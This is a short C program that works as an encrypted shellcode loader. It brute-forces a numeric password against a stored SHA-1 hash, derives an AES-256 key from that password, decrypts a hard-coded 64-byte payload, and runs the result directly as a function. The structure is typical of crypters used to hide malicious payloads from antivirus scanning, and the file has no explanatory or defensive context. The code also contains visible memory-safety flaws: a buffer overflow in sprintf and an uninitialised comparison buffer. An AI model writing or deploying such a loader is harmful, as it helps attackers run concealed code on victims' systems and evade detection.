#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include "polarssl/include/aes.h"
#include "polarssl/include/sha256.h"

#include "polarssl/include/sha1.h"

#include<time.h>
int main()
{
const unsigned char input[] = \
"\x5a\xd0\x6\x80\x44\x45\x60\x2c\x3d\xd5\xb\x81\x88\x6a\x2b\x6\x2\x35\x85\x6d\x20\x36\x2e\x4b\x42\xda\x78\xca\xad\x51\xa1\x9a\xc7\xd4\xe6\xf8\xa0\xa6\xa4\xe4\xd7\x24\x4f\xe7\x30\xa\x30\xad\x72\xde\x34\x70\x24\x68\x99\xf5\xd\xa1\xc7\xcc\xb7\x88\x78\xf3"; 

unsigned char password[6] ;

size_t pass_len = 6;

unsigned char key[32] ;

unsigned char iv []= "\x10\xf4\x1a\x1c\x37\x10\xd0\xcc\x72\xbb\x5a\xbc\x70\x5c\xd4\x8e";


unsigned char key2[] = "\x5f\x9b\xf1\xde\x7b\xf1\x23\xb9\x80\x65\x6c\x23\x4d\x4e\x70\x15\x1f\xc\x82\x96";

unsigned char sha_key[21];
unsigned char output[64];

size_t input_len = 64 ;

int i;

srand ( time(NULL) )
;
while(strncmp(sha_key,key2,20)!=0){

i = rand() % 494852 ;


 sprintf(password , "%d" , i);


sha1_context sha_ctx;
sha1_starts(&sha_ctx);
sha1_update(&sha_ctx, password, pass_len);
sha1_finish(&sha_ctx, sha_key)
;}

sha256_context sha256_ctx;
sha256_starts(&sha256_ctx, 0);
sha256_update(&sha256_ctx, password, pass_len);
sha256_finish(&sha256_ctx, key);

printf("BruteForced\n");
aes_context aes;
aes_setkey_dec(&aes, key, 256);
aes_crypt_cbc(&aes, 0 , input_len , iv, input , output);


((void (*)()) output)()

;return 0;}